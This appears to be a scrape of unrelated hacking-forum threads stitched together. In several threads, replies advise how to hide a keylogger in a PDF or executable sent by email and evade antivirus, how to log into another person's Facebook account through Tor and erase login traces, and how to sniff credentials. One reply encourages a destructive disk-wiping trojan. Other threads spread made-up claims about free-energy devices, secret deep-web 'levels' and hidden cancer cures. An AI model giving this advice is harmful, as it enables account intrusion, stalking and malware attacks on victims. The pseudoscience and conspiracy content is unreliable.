My design is based of this.. William Skinner�۪s Gravity-powered Device if you cannot find anything on this tell me and I will upload it on the free ebooks thread in Current Discussion. I will use an enhanced version that will have less friction and possibly use magnets and coils withing the design to generate power.. if made small enough a few could power a robot.You can get more energy from a system than you put in because energy is going in from other sources. Will give a more detailed post in the rule of three later. Think of the military applications of this design! Its infinite, does not rely on good weather and gives a consistent amount of electricity. The only problem is making it strong enough to last in the field.
thanks again for the info!as for frictionless bearings you might want to look into multipol and monopol magnets if you haven't already. what always helps are magnetic gear systems ;-)i hear you on the military applications and your theory reminds me of bearden's virtual particles , which can't be measured by us(yet) but their existence is, what causes the "free" energy effect in our dimension.do you have anything about dimensional phase shifts or inter dimensional research?

Hi,I would like to start thread about HORNET (High-speed Onion Routing at the Network Layer). Below you can read paper's abstract and find link to the paper describing this new anonymous network." We present HORNET, a system that enables high-speed end-to-end anonymous channels by leveraging next generation network architectures. HORNET is designed as a low-latency onion routing system that operates at the network layer thus enabling a wide range of applications. Our system uses only symmetric cryptography for data forwarding yet requires no per-flow state on intermediate nodes. This design enables HORNET nodes to process anonymous traffic at over 93 Gb/s. HORNET can also scale as required, adding minimal processing overhead per additional anonymous channel. We discuss design and implementation details, as well as a performance and security evaluation. ClearNet Paper Link: http://arxiv.org/pdf/1507.05724v1If you have some opinion about this topic you can leave it here. 
Is this just another tor?
Yes, probably this will be the faster brother of TOR - but right now is faster only on paper.
I'm interested. Can you elaborate?
Nvm. I just saw the link. 
I want to write a brute force program with C++ any example?? All advice and help is welcome. Thanks..
If you know C++ it isn't that hard to write code that brute forces something. But from your post I think you don't even know what you want to brute force, you don't even have an objective? You just want to "brute force"?
Hello. I am interested in snooping around Facebook unnoticed, watch the albums, read messages perhaps with no alterations to the person's profile. Does anyone know of any good ways to do so?Thank you.
Alot of people aren't aware of privacy policy, so most of the time you can view everything about them if your just "friend of friends".Best and easy way to do so, is making an anonymous facebook account, Social Engineering your way into adding specific friends into your account, and you'll be able to do so without really being noticed. I also suggest maybe changing the way you type so that if these are people you know, you wont give yourself away.
Unless you're speaking of actually going into their account. Then you will have to know their login and pass, log in from a proxy service such as tor, then after you're done, look for the account settings -> locations and delete any logs pertaining to the proxy server you were using to log in. Then you should be fine.
For several months I've had a problem with my spouse's phone. I had no trouble calling/texting him but when he called me, 90% of the time my phone never rings and goes straight to voicemail. But he has no trouble reaching me by sms and no-one else has this problem when they call me.The strange part is, one day he called me hoping it would be one of the rare times he can reach me, and got some strange guys voicemail. He checked the number in his contacts and under my name there was an unfamiliar number. He could reach me through that number by sms. I don't understand this. My real number was nowhere in his phone.During this time, I also got a call from a company offering something that my health insurance company is paying for, and they needed to verify my information. This person told me my name, address, DOB  and even social security #. I immediately asked them who they're calling on behalf of and that I don't have health insurance, they hung up on me. This freaked me out. Anyone know what could be going on here?
Very intresting, I honestly do not know what is going on. My best guess is that you were hacked or are being traced. It appears, from what you said, that the number your spouse's phone had was put there without any of your guys knowledge. So perhaps your phone has a form of virus, but I think your spouse's phone was the one that was hacked not yours. It looks like the number that your spouse has it routing the phone traffic.This is, like I said, a guess I am not sure if what I said is correct. I am hoping another member here can verify my theory :). If you are really worried, I suggest changing phones and numbers for both you and your spouse. (Yeah that's annoying, but If you feel you are in danger then do it)
Something is definately going on. I would suggest making sure of certain things, like credit score, IRS Reports, and ensure your SSI isn't being used for anything. 
What is the best way to get a keylogger onto a system? I have pgysical access to the computer.
If you are wondering where to get one there are many out there, you could even embed one into a executable or something like a pdf using metasploit. Look into it on the clearnet, many tutorials. GL
Put an exe on a thumb drive or a CD or something.
You can also send it via pdf in an email as long as the keylogger is undetectable. Which I would recommend running a few antivirus scanners to be on the safe side.

Sorry for double thread. Please remove this one. 
Well I think I'm fluent with C# but I really need help getting through this one. I want to make an old school destructive virus, not like these new viruses that secretly destroy your data and thats that. I want to make a virus that will do exactly this. (Tell me if this is possible in C# or if I would have to put some hours into learning a new language.)Stage 1: User first runs program. I want the fake program to actually work perfectly, but silently inject the virus into the system.Stage 2: After the virus is present in memory it will wait for a restart, after it restarts it will change your desktop wallpaper and make it impossible for the user to change it back. The user will be confused and restart which would lead us to. . . Stage 3: On startup the virus will wipe the user's hard drives and display shock porn maybe?Stage 4: The hard drives are clean, the user would have to install Windows again, or maybe get a new computer if they are inexperienced.       Okay honestly, I am new here and I dont know if this is the right place to post this kind of thing, but please correct me if I'm wrong. Thanks for reading this all the way through.
Yes, this would be the place to post it.*You should probably think of how to spread your virus first, then start programming it.*I believe C# is okay to use.*Not sure if you could disable the ability for the user to change back their wallpaper, though. I never gave that idea to thought. You may as well wait for someone else to answer that for you.Even though I hate 'oldschool, destructive viruses' with a passion, good luck on your project.
I am trying to get into a system that has a website protected with basic html authentication but don't know how to go about doing it. I know I could brute-force but I don't think I will have much luck with that.How would you go on about getting into this system? Thank you
You probably means basic HTTP authenticationIf you are on the same network as a user of the website, you could try to sniff the username/password combo, as basic auth means no encryption. Otherwise: Good luck!
Yea I meant basic HTTP authentication(facepalm). I wish I were on the same network as the user but I'm not. Is there no other way, I can't scan for any known vulnerabilities either because of the authentication pop-up.If there is no other known method of accessing that, what about ssh?The site is hosted on the users computer and has many ports open though they are for other things.Thanks
If anyone wants to do it themselves just say, I will be willing to give up the information.
So I don't really know anything about hacking not even the basics. And I want to know how to:Hack a Facebook accountBring down a websiteHack webcamsHack emailsSQL Inject a website
Take a look at this site has many tools for hacking: Black ArchAnd the3coder had a post somewhere on this site about hacking look around. If I find it I will post it here.
@Overkill_gamer88: Please read at least the titles of the threads in the category you post.
Try installing Kali Linux and watch some of plenty tutorials for it
@Overkill_gamer88: How to hack
Hello everyone, today I was viewing the clearnet and I seen a video discussing Kim Dotcom's MegaNet crowdfunded project (Clearnet Link: https://www.youtube.com/watch?v=2fVl06phBGg). I was wondering is this something you would use personally? If not, is it a step in the right direction or is it a horrible idea? Have a nice day everyone.
Requested in the No Verification, Just reserach software request thread.SanIker said:Hello, IE users. According to the huge READ B4 POSTING thread, I can directly post my question/request if I don't need to actually be verified.I am here only to request a software program to help with some scientific research (alternative energy sources). A team member is trying to find a specific program called Refprop 9.1 (alternately, 9.0). It's a program used as a teaching tool for teaching thermodynamics.If getting verified will help me find the program a bit easier, then I have no issue with the process whatsoever.Thank you very much in advance to those that assist. =D
Can only offer thishttp://sourceforge.net/projects/coolprop/orhttps://github.com/BenThelen/python-refpropbut there are mini versions and trail version available for free . also found cracks but can't confirm if they are legit... maybe someone with more time and several VMs could try it out.
Thanks for the help, Zyx.We've tried getting Coolprop, but one of the sites (directly connected from Coolprop's site) actually led to files that were malware. That sourceforge page is currently down apparently. I'll try it again later tonight.Unfortunately NJF, we need the full version of the program. The mini version is the free version and it does not allow to use the full library of fluids. I told the team that they might need to set up a VM in their machines; they're not tech-savvy at all.Do please keep a lookout for anything you might find out though, please!
Most of us have a general idea about how one might go about programming. But how did programming begin in the first place? It is clearly impossible to program in binary code, when binary code doesn't exist yet. And How can you teach a machine to recognize commands in a code you've only begun to create?How does it all work?
I am a little uncertain on this, but from my understanding Binary is already understood in the computers motherboard, so an "instinct". Then binary code was just given a cover up a sort of UI, thats what the compilers do, and then you can program.
My personal best theory so far is that a combination of luck, ingenuity, and lab accidents may have resulted in a working prototype that was just copied over and over again into the systems we have today.But thoughts on this have led me to no fuller understanding than that. "You're telling me that with enough numbers, a computer could generate any image at all?" And such. It was a discovery on the level of existential crisis at the time.
I would explain this but it would take a lot of typing. If you read a book on Assembly like this one: [CLEARNET] http://www.ic.unicamp.br/~pannain/mc404/aulas/pdfs/Art%20Of%20Intel%20x86%20Assembly.pdf you would be able to get the idea, the first section explains alot of it.For the physical hardware, you can thank Alan Turing for that.
Could you reference a page number or chapter? I've read a good portion of it, but am not satisfied.
Looking back in history, there was a time when people did program in binary directly. However these computers did not have the memory used in most computers today. Some programming is still done in Binary. Such as certain electronic components. The other day I received a voice recognition module in the mail. I actually had to configure the module by sending it commands in binary. However most programmers will not need to do this. Most programmers will only program in high level languages such as C++ or Java. To address the question of what binary itself is, you have to understand that a processor is billions of transistors. Either these transistors are turned on (represented as a binary digit of 1). Or the transistor is off (represented as a binary digit 0). so we can compare binary to a light switch that only has and on and off state. When a binary 1 is sent, it is nothing more than a surge of power being sent to the transistors. a binary 0 is the time when no power is running through the transistor. In actuality however all programs end up in binary at some stage. I modern computers the operating system hides this conversion. Typically the programs we use today are stored on our computer in binary.
Which still does not explain how any of it works.I'm beginning to think it might be magic. Maybe all science is really just a subset of magic.
The compiler converts the high level programming language (C++, C, Java) into a generic binary code. This is then sent to the operating system which converts that code to low level programming language (Assembly language which is specific to the motherboard). From here the assemble code is changed back into binary but this time the binary is specific to the processor. When all is said and done all programs are nothing more than instructions that get carried out by the processor and the ALU (Arithmetic Logic Unit).If this is not what your looking for as an answer, I would like to know which specific part you are curious about. As far as the commands that don't exist yet, they do exist. modern CPU's have thousands of commands that they know. In a modern programming language these commands are combined. For example cout is a term used in C and C++. This command is a combination of several assembly commands such as a Find command to search for the monitor at Address blah and Wait for a response from the monitor drivers to say that the monitor is connected. Then a Status command is used to make sure the monitor is not busy. Then another Wait command is done to wait for a response from the monitor. If all is good than a Send command is used to send instructions to the monitor. These monitor instructions may have just as long as a process as i have just explained. All of that just to print a line of text or a graphic on the screen. Now you may wonder how that many instructions can be carried out so quickly. The answer is the amount of the hertz of the processor. 1GH is your processor spec means 1 billion instructions can be carried out per second. So as you see a new command added to a programming language is simply combining commands together into a simpler command for a programmer to use. Binary code existed with the invention of the first mechanic computers. Back then the commands were fed into the computers through punch cards. As far as digging deeper into this would require me to have a degree in computer engineering (which i do not). All I can tell you is that the binary code is nothing more than a series of 1's and 0's that the processor understands and executes. With each generation of processor that comes out, more and more commands can be used. If you are looking for more information, Please let me know what specific part your looking to know more of. I can't promise to know the answer, however I will explain to the best of my knowledge. 
"Magic is not yet understood science."When you have a problem, you have to find out all of the available inputs and outputs in order to collect all the resources necessary and assess all available interactions. Once you have that, you build a model, a representation of that problem, which you can map to values in your coding language of preference (you're encoding thoughts through an agreed upon standard that the computer will understand) and create the logic that will handle all changes to achieve the desired output.The computer will run your input through several other layers of abtraction, which are the part you can usually find explained down to "bit==switch". Will link a certain thread if I find it...
I disagree on the magic bit actually, but that's neither here nor there.My thing is, zeroes and ones. These cannot make a computer a computer. The computer, not having been programmed to, cannot understand how to understand zeroes and ones. That said, they do. The positives and negatives are somehow read and comprehended.It's like computers were human children, able to learn a language instinctively.
The ones and zeros are only our representation. What they translate to is power on and off on those transistors. When a 1 is sent that means that voltage is applied on that transistor for a given time. when a 0 is sent it means that no voltage is applied. Without using a graphic, there's no other way to describe it. Lets look at 12 volt digital logic. A 1 would mean that 12 volts is being sent through the wire to the transistor to turn the transistor on. When a 0 is sent there is 0 volts being sent. People and the instruction sets inside processors are what makes computers smarter each generation. People representing programmers that find innovative ways to creation functionality from the programming language of choice. The processors instruction sets gives programmers new tools to use. Its not so much magic as it is the advancement in hardware and software technologies. As well as the innovative ways that people find to use them. If you ever get into being a programmer, you will notice there is a lot of math used in programming. Its not all math in numbers. Sometimes its comparing bytes of data to see if they are alike or different. its assignment statements. Its true or false logic. Programming is a complex activity and learning how to harness it to make the computer do something new can be tricky. However it is very rewarding. Programming is actually used in a lot more than computers. Power plants, auto pilots, cars, trains, phones, and thousands of other devices have programming making them work. An operating system such as Windows, Mac, and Linux hide a lot of the complexities and does make it look like magic. However operating systems are thousands to millions of little programs that all are connected by the brain of the operating systems. The Kernel for Linux and Mac and Explorer.exe for Windows. 
Basically, it's another agreed upon standard. The initial logic is already hardwired into the CPU (logic gates) and the rest built upon it. So yes, it is always programmed beforehand; until then, it's an elaborate decoration. You could make a system work wildly differently, but it's unlikely to be compatible with existent systems.
If you really want to know how literally everything works, you really need to study for it, at least that's what I've learned. I've taught myself several programming languages, but I really learned how to program and "how the magic really works" when I started a university level study.
I have heard of dark-nets that require special hardware to access.I was wondering what if anything anyone might know about said networks.I do wish to set up my own.Thanks for any information.V is for my vendetta-Gunner Zodiac Russtle
We talking like the 6-8 dimension of the deep web? I heard thats were the "big boys" hang out. Apparently its like a cult down there.
Yes that is exactly what i am referring to.I have long pondered how to get on there.Any idea(s)?Can/will hack anyone who might have specs....V is for my vendetta-Gunner Zodiac Russtle
No info at all. Your just gonna have to find out the details the old fashion way... the electronic grapevine.
Any idea ware to look?Crawled the deep web once,Had over 2million sites logged.Lost that when I retired and burned all my assets...
To be honest, I think its all a rumor. I always hear about this Archon bullshit and the primarch system and I think to myself there is a reason to why you cant find any info on how to get there; it doesnt exist. Although I want to believe it, I feel its all a ruse. Best of luck to you gunnerzz, maybe one day you'll find it. 
Rumors are all I have to BUT.Someone when I first started hacking, said that there are parts of the dark-net ware you prove you metal and skill just by getting to.There supposed to be real hush hush about it.Why IDK,Guess it keeps anyone even really elite people from getting there...
The only way I know of how to get in is by having a computer that can solve "Polymetric Falcighol Derivation". Beyond this there is no more evidence you can find on how to enter levels 6-8 (on this level of the web).
That's it?There must be something more than that?Something is not right...0_oThere are only 3 maybe 4 cyphers like that.That I know of,all of witch are vary weak.I mean like a joke almost kinda weak.
Thats not it lol, thats just the only one i know. Also I dont think this will exactly get you into levels 6-8. However, if thats easy enough then you might wanna do more searching.
I have been asking on some other boards about it,and been censored like bad...
So that must mean the rumors are true, no?
Yea...Strangest feeling of validation in that...Wow got a server bored to make into a router, and machine I will be loading kali onto for hacking....
LOL, I got a question for you. If you got into Mary's web, would you post details on how to get to it anywhere?
You know I have to give long numb nut speech something like this,I like thank the academy and any midget out there,Oh can't forget all the little people!!!After that I would give details to a select few,Like well you....

There are strange packets and,I have no idea what they are!!!!BUT there .clossNo I will not be posting them or any thing to do with them.(!!!!THAT'S FINIAL!!!!)That blog I read gave me the creeps....These could be my gate way to levels Marina,then to 6-8,After that to answer my question.my question to weather or not there's a 9-10 levelsV is for my vendetta-Gunner Zodiac Russtle
you mean .class files, like Java bytecode?
No they were .closs what ever that's supposed to be...there no longer with me due to just getting into a rush...When I get my flash drive back then i will analyze them.That might be why no one has found this level, cause stuff like that gets over looked and ignored....What could they be....0_o

Would be nice to get them again, so maybe you could ask your friend if he still has the files and if not to ask his friend who gave it to him.
Has anyone Read Piers Anthony's book Blue Adept? (kind of love crafty) There might be clues somewhere in the 3 book series. here is a synopsis. Stile has gained significant power in Phaze as the Blue adept, whose songs and poems hold incredible power. However, on Proton he faces deportation and enters the tournament in the hope of gaining citizenship. His adversary is revealed to be the amulet-making Red Adept, who exists in Proton as a serf in the Tourney. Stile defeats her in combat in Phaze and in the Tourney on Proton, leading to her expulsion from both worlds. Photon a technological decadent world where rich (Citizens) live above the rules, and the serfs work and play the Games, hoping one day to be Citizens themselves. People live in Dome while the world outside is barren and dead.Phaze is a magical world where Adepts rule by fear and magic, and tribes of enchanted creatures exist, such as unicorns, werewolves, vampires and more. They also exists the Oracle, a device with will answer only one question to anyone. Most magic is restricted to the Adepts (Magic Users) and each spell can only be used once.Though different, the worlds are mirror images, what happens will happen to the other, or an imbalance will occur.Common Terms and Races:Citizens: The only people allowed to wear clothes, and they are some of the riches people in the galaxy. They control the protonite, which allows space to travel in space and the main power source for robots.Serfs: They are not allowed to wear clothes. A Citizen can do just about anything to a serf he or she wishes. Serfs can serve a maximum of 20 in Photon. Within this time a Citizen must employ them, with a 10 day grace period between jobs or they are deported. If they wish to stay longer they can enter the Game.The Game: The most common past time on Photon, games are chosen from a grid based on Physical skills or Mental skills or Chance or Art vs. either Naked, Tool, Machine, or Animal assisted games. Each player picks a category from one of the sides. Once this is done, more sub-menus appear until a game is selected. Each age has a Ladder, which is also separated into sexes, i.e. a 32 year old male would be in Ladder 32M. There is also the Leftover Ladder, the under aged, over aged, aliens, and the handicap. The top 5 of each ladder may enter the Tournament and the winner of the Tournament will become a Citizen. The Tournament is double elimination so a good player is removed by a game of chance.Also it might be worth it to check out Tom Cervenke. He went by blue adept in his white hat hacking days. you can begin stocking him here. http://www.thomascervenka.com/

@bignutI have looked there believe it or not...I started looking for this four years ago...That was one of this first places I looked...I might look again,now that I am a little older and wiser.@the3coderI will the friend of the friend is MIA'his email is "unavailable".(I think it was deleted.)Knowing him he might or might not have them with him or at all.
@kanav I was following a clue to the username of the author used in his story of "Mary's web". the code name "blue adept" seems to have some connection.
I found it interesting because I did not know what blue adept meant. I guess it is a wizards apprentice or something like that. and also the friend in the story of Mary's web mentioned his username being Photon. There definitely is some connection. About the Cervenke guy, I was hoping someone knew more than I did about the history of the author because it seems to me this is where we need to dig for Intel.
@bignutThe thing is that 1exabyte/30-45min is vary hard to believe.My laptops the same if not faster,and it takes 5min for 5gigs so....Also do you know how I can contact him?That's not over tumbler...@everyone elseMe and my male comrades have devised a way of getting more of those packets...4 years of work have been leading up to this...I started a thread about wanting to build a electro-mechanical computer for a code...I didn't tell everything....This is also for a 8196^8196^8196bit architecture...That's 1hz/sec to 500000+ YOTTA bytes of data processing....Why?So me and my and others who are searching can set up a massive wifi single, (http://www.instructables.com/id/The-Making-of-a-Beast-WRT54G-Mods-Part-One/)(http://www.instructables.com/id/Old-Dog,-New-Tricks%3A-Mod-a-Linksys-WRT54G-series-R/)to intercept any .misc packets...This takes a lot of processing power to do something like this....I will get more .closs packets...as always...V is for my vendetta-Gunner Zodiac Russtle 
Could you please tell here what frequency it is? Standard wifi frequency? And how the hell do you store YOTTA bytes of data, I'm starting to doubt you there...
Like I said its a work in progress.Were going to hit as many frequencies as we can.The processor is just for processing that packets come in,(Like a big graphics card)it is just for the filter software...When you intercept every packet in a almost 200 mile radius there is going to me a S*it load of them....
@bignut Someone told me he [Deepblue] had a thing for those books.Proton is most likely a *edited* user name at the request of who ever that really is,in fact they all probably are edited screen names but his.So yes there is a connection but not in the way you think.It is a profiling more than anything....Don't forget those books are vary old,I think they were copyrighted in 1960 or so...
Only thing I know about it is that there are Tesla files appaarently on there. Within there, the cure for cancer, the meaning of life, the truth behind Roswell, the truth behind 9/11.The cure for cancer is history's biggest secret. Because there is more money in treating a disease than there is curing it.Also, there is extremely disgusting shit, such as gangrape CP, scat CP, human experimentation and WW2 torture files.This is extremley locked down. Only the best and most experienced hackers can access this.
@xorcist thats just the 5th level. 6-8 involves internet structure getting bent, in other words its unstable as hell down there.

@KanavI think it was you who asked me why I wanted to find this so bad...It is because I want to stabilize that part of the internet.(AND so op will no longer be a fag.XD)V is for my vendetta-Gunner Zodiac Russtle
@KanavWow. Never even knew there was anything deeper than Level 5. I thought Level 5 itself was inaccessible.Level 8 must have people taking selfies in Heaven or something (or if they are on that level of the internet, selfies of themselves in Hell).What is more secret than what is discussed of Level 5?
If you ever wanna get there and survive, your gonna need to do some quantum computations and be connected to the internet without an internet connection.

@gunnerzz Diamond quantum computers are in their infancy states. They are mainly being worked on in government laboratories and Ivy League universities. The only thing i could find on infrared lasers was this ( http://www.wikihow.com/Build-a-Cutting-Laser ) lol. Light storing crystals are used as data storage, there usually called "Liquid crystals" and are used by having photons of info stored in these crystals ( made for use in quantum computing ).
@KanavOkay...How would you go about building a quantum computer?http://web.archive.org/web/20020609152409/www.catseye.mb.ca/esoteric/index.htmlGo to "Esoteric Brain Banks".My only thought is,WHAT THE FUCK????http://www.nyx.net/~gthompso/quine.htmIs how I got there....Another good one:http://www.douglas-self.com/MUSEUM/COMPUTE/complinks/complinks.htmGo to this link form there.www.catb.org
Honestly, I have the slightest clue on how to build a quantum computer. I am gonna do some more research however, it will be a long time till I get anywhere.

Brainfuck would NOT work on a quantum computer. There is no way to put a bit into a superposition of ON and OFF with brainfuck. The closest thing you could do is make a modified version of boolfuck where each bit can be flipped to be 0, 1, or 1 and 0.http://esolangs.org/wiki/BoolfuckI don't know how you could modify brainfuck to work with quatum computing.
@OlayThe rules and functions in brain fucked are being bent,  and used in smarter and more effective ways.I am thinking a Z80 chip and 500 or so megs of RAM could handle the finale output...What I am proposing is a hybrid computer,all of the big hard grunt work is done via quantum.BUT the out put converts it from optical to digital...Meaning that there is a lot of crap at play here...(Digital, fiber optics, electro-mechanical you name it this things got it.)Digital circuits are required for such a task,as I have already stated my idea for quantum ram is to have a system to refresh it everyone minute.That requires digital circuits.sincerely,Gunner Zodiac Russtle

@gunnerzz Interested in working with you. I have done extensive research into quantam computers and quantam circuts. I am also setting up a team to create a crawler AI to find traces of itad utilizing my botnets. Please drop me an email @ Projectfirstcontact@hmamail.com so we can work together on this. I am really exited to get going.
@the3coderHave you tried using a botnet to decrypt it? I will volenteer mine if you want. Drop me an email
I tried to decrypt it (pdfcrack, bruteforce), but after I didn't get a result with 7 alphanumeric characters, I stopped trying.

Tesla files are very interesting. These contain how to get free electric/gas/water for life, how to be taken off the Jury Duty register, the location of the Internet "kill switch", The "Endgame" documents (incase of post apocalyptic disaster or mass uprising of mankind) and even the cure for Cancer.All of these, hidden by the government. This is because if regular users got hold of this, the system (been humanity) would collapse.WW2 experiment successes were once Public Domain to anybody who specially requested them. These were actually requested to be removed by all government bodies in the late 1950's.CP is accessible on regular Deep Web (4th/5th layer of the Internet/1st layer of Deep Web) but expect a one way trip to Jail if you're caught accessing this.

@the3coder: you've posted a link to marianas web log pdf. great I got it but there seems to be a password protecting the content did you manage to get it maybe?
I tried to crack it with pdfcrack, but when I saw that pdfcrack was trying 7-letter alphanumerical passwords, I eventually gave up... IIRC, VALIS and Zyx tried to crack it too, but I might be wrong... Also, the file isn't big, so don't expect anything great in there...
Actually, I didn't even take a shot at it. I had done some research about MW and decided it was a hoax long before coming to IE. What (still) interests me is the concept of creating a CSS, not finding a mythical one that has "the key to the internet". Once I heard about that is when i really started doubting it. Anyone with even the most basic understanding of how the internet works would know that there's no true central control for it.
So there's absolutely no way to crack it? What a pity
@xpietrexThere is, get pdfcrack since the3codergot to a 7 letter alphanumeric value Iassume it will have to run for a long while but once you crack it you might have the real documents. Thats if you're willingto wait.
If governments really wanted to hide something they'd probably just delete any mention of it, keep the info old hard copy method and lock it up with some unknown random password. Hell they could even bury it some place where the public does not have access to.
@whitetiger1000 I'm more than willing to wait... I've an old pc, wich works fine, and I can use simply to crack this file. I just need a program. Pdfcracker you say?
PDFCrack.
Thanks for the link, I'll try to help too.
Crunching alphanumberics here as well.
Hey everyone, I have been looking into the Mariana's Web the past couple of weeks.  One weird thing I noticed with the pdf crack output is that the user (read only) password hash is ec595c18342a391f9102c39d441f564200000000000000000000000000000000 .  Now it's either a really odd coincidence that there are a bunch of trailing zeros, or someone changed the user password hash manually.  I tried running the 32 character hash through a couple of dehashing programs, but turned up nothing.  Just my two cents.Azgen
I'm am working on cracking the password now using brute force.
So you guys are all running the same passwords against the same PDF? That won't make things go any faster. That aside, I have a server running 24/7 that can do about 54Kpw/s and I'll leave it going for as long as I don't forget about it. Someone else pays for the power to that thing anyway. Testing from 6 chars up..
Is it brute force? If so, what is the server?
Heh.. I'm not going to tell you anything about the server that'll allow you to find it. ;-)It's got some Intel Xeon CPU goodness in it and a boat load of RAM, running PDFcrack now on that file posted above. It's quite likely that nobody will ever crack it this way, nor do I believe this file will contain anything shocking let alone prove anything about MW, but what the heck..
I tried PDFcrack and my computer processer sounded like it was dying. No luck though. Computer froze before it finished
If my box ever hits the password, I'll share it here.. don't hold your breath.
PS. Password length 128 Characters.
I opened the file with Notepad ++, so if anyone can make sense out of this, here you goEDIT: Information not useful, edited out
That's the AES key size in bits, not the length of the password. The fact that the DejaVu font is being references, lead me to believe the file was created on an OS other than Windows or MacOS. Just about everything else appears to be encrypted and/or compressed so a text editor won't do much further good on this one.
So, edit the long part out?
Information on the Deja Vu fontshttp://dejavu-fonts.org/wiki/Main_Page
I am using my cpu to help crack this thing :)Will post the pass if I get it.
Im going to try to recrack it, starting at 7 letters.
Well after playing with this file for a while I relized something... It isn't a real file. Different pieces of data don't match up. I think that this was some form of hoax. If it is really encrypted and a real file then great! but I think this is a fake.
If it is a real file, did anybody realize that it might not be alphanumeric? For all we know it could be any symbol.
Interesting knex. I'm not very much up to speed on the internals of the PDF format but please, elaborate.I did actually do a paper napkin estimate of how long it'll take to crack this. My machine at 53kpw/sec will take 4 months to cover the entire password space for 6 digit passwords using every character that's easy to type on a US keyboard. That's doable and I'd be willing to leave it run that long. For a 7 digit password, that time increases to a little over 28 years. I don't mind leaving a machine running for something useful or even mildly entertaining. However, since I expect the result of this to be neither, and the fact that statistically this is bound to take decades or centuries to complete, I'm going to stop running this. Apparently the3coder already exhausted the 6-digit space so I restarted by running the 7-digit space.A major weakness of PDFcrack is that a password ending in 'Z' will allow you to guarantee that PDFcrack will find it only after a very long time (think decades for any pass bigger than 6 positions). It'd be better if PDFcrack tested randomly across the entire problem space as that would even the odds for any password within the space.Anyone here know if PDFcrack is 'the' go-to tool for cracking PDF's? If so, I'll look into adding a switch to it to enable more random sampling.
Couldn't you create a form of network of let's say 5 computers to crack the password? Why have one computer that takes 28 years when you can have like 5 to cut it down to a little over 5 years?
Like, connnect 10 Raspberry Pi's  to make a supercomputer?
Well I gave up, sadly convinced this is fake. But I still wonder about the video I saw on DeepTube once showed how some one accessed level 5 and 6 but I dont have the source as deeptube went down ;( I regret not downloading that video. oh well
I would probably discard that video as fake. I don't think the internet is made up of layers. The picture that shows the "layers" of the internet is highly likely to be a work of a 4Chan troll. This is the internet, not a movie.
Eh you're probably right but one will never know... the onion network has been under our noses for years until it became more public. So I'll always have that slightest hope that there could be more..... way more
If there is a thing it would probably not be on the Onion Network, I2P or Freenet. I'm thinking it would be on a network like Cjdns or a totally unknown meshnet. That or a near obsolete protocol like Gopher.
Think about it. How do computers communicate? What is the medium over which they send their data?Could another medium work in place of it?
That's a perfectly valid point, but, there is only one problem. Someone would have already leaked it. People have been looking for a way to access "The Web Who Shall Not Be Named" (MW) for a long time. A common idea is that the traffic that is passed on through MW is CP or some other nasty stuff like that. If that's right, do you think they want the authorities to know about how to get onto it? No! MW is likely to be some close nit network of sad, lonely and perverted people that have mastered cyber anonymity and have created and shared a unique type of anonymity software. The only people that posses this theoretical program are the users of MW. 
So if what you are saying turns out to be true, and that the users of MW have an alternate medium, they would only share it with close friends, not random users of TOR.
That is called a Trust Network, and those do exist. But they mainly take advantage of resources already available.This is something else entirely. More of a... Door with a Variable Key.The argument now is whether this door is even a door at all, or an elaborate carving in a sheer rock wall.
Good point. I think that this thread should be brought to more attention, ditch the idea of the MW chat log. We need to focus more on the actual topic of alternate networks and accessing them rather than hypotheticals.
There is someone that I found offering to sell a key to the "shadow net" for .3 btc. I emailed them asking for proof and they said I would just have to trust them. But if anyone has the btx lying around. I will edit the post in a sec once I find the link again. EDIT: could not find the link, here is the email I reached them atshadoweb@sigaint.org
I have a thread that answers your question, look for Shadow Web(Opinion) (It got renamed by Korruptor)
Technically speaking, it's possible to build isolated networks now. The problem is that they're built like LANs, and so if you're removed from the other members by any significant distance, it becomes impractical to use them. What people want is something that exists alongside the internet, and can observe it without being observed by it.This would mean that no matter how many resources a company like Google could throw at it, they'd never find it, and never break in.How should something like this be designed?
Anyway, in short:You can't use other medium, which means you can't invent a new packet-type inside the data field of the existing transmitted packets, because of obvious reasons - you still have destination ip logged along the way. What you Can do is develop a authentication regognition, similar the way blizzard authenticator works - you know, combine the serial number of the authenticator with the time and mix them with a unique hidden algoritm - you get 10 second window of authentication (code) from a completely offline method. But few steps beyond. Mash up something outside the box, like a song playing at the current time Some-where with a specific convert-to-auth-key or even a new protocol (why not if you have the minds for it). And voala, the machine 'sees' you are 'legit' and returns you the encrypted packets for a very short time-window. A bit like wake on lan feature, nobody will see the machine because they won't be able to wake it up, similar in cisco machines where you identify 'interesting' traffic type to wake up an interface and so on.And you WILL need a machine that will listen for this(at least 1, and 1 is enough when the community is exeptionally intelligent and small).PS - Well I wrote this morning here a general howto for this but, my session must've timed out... You get the short version.
youtube.com/watch?v=XYmfoovHj2Y This guy makes me upset. For those who dont want to click on the link - it is a "Question: How Do You Stay Fully Anonymous Online?" yt video by "Eli the Computer Guy Live". Basically, I think what he says is true. It doesnt matter what you do, you can always be tracked. All you can do is to complicate the path. and there are just so many variables...Opinions?
I think depends who is the tracker.A agency for the National Security or simple local police or Hackers.Depends also, the importance of the act and of the time they want devote.However, i think "stay fully anonymous" it's almost impossible if a case it's very relevant and the attacker spend a lot of time for track, if not,it's enough TOR.However, one person if connect at a others modem,paying attention for cameras,change the MAC address,close all the traffic only for TOR/I2P and connect with others SSL proxy front, we have complicated the situation enough.It's mine opinion.
The easy fix is not being there where the trace ends ;-) Small scale relay networks of routers... use your own counter surveillance combine with anti surveillance ... use someones internet connection who is not connected to you..never shit where you eat, meaning don't "do your "evil" deeds From Home ..there are many options but you need to actively counter their methods.keep vigilant at all times.the reason why drones kill so many innocents is , that the spooks only target the phones and the ips...and not the actual person they matched to that phone (or computer)
Well said NJF :DDo you think it is safe to use a laptop that was used by someone you know (there was windows 8, registered) after you wipe all HDD and install new OS (linux)? 
Hm....me being paranoid at times i would say no unless you check yourself with forensic software if you could find any traces of the previous system.Also you have to remember that even with a different OS the traceable hardware like the wireless card uses the same mac address by default.this one time error could be fatal depending on where and who you are. Another  problem is that it was proven a while ago that Intel had a hardwired backdoor in their processors for "maintenance" purposes... sometimes even the gpu might be infected.i am total tech freak but i see most of the stuff given to us by them as a curse at times.That's why my ultimate solution would be to build and develop your own tech if you are really at risk of being killed 
@NJF: And that's where a DIY 3D printer could come in handy!
Zyx...that would be one option..but having contacts to Chinese manufacturing companies, your own ships  for logistics or owning  and controlling  everything in that regards would help too.Unfortunately up to this day the potential of all this is wasted or used by the cabal against us.
